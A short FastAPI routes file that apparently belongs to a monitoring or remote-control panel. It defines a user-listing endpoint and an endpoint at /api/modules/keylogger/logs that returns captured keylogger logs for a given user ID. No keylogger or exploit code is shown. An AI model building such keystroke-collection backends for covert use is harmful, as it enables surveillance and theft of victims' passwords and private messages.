# api/routes/routes.py
from fastapi import APIRouter, Depends, Request, Query
from api.service.userService import UserService

router = APIRouter()

def getUserService(request: Request) -> UserService:
    data_manager = request.app.state.app_state.data_manager
    user_service = UserService(data_manager.user_repository)     # Create UserService with UserRepository
    return user_service

@router.get("/api/users")
async def getAllUsers(user_service: UserService = Depends(getUserService)):
    # Use the user_service to get users
    return user_service.getUsers()

@router.get("/api/modules/keylogger/logs")
async def get_keylogger_logs(id: str = Query(None), user_service: UserService = Depends(getUserService)):
    """
    Retrieve keylogger logs for a specific user based on the provided ID.

    Args:
        id (str): The user ID to retrieve keylogger logs for.
        user_service (UserService): The service to handle user operations.

    Returns:
        The keylogger logs for the specified user.
    """
    return user_service.getKeyloggerLogs(id)
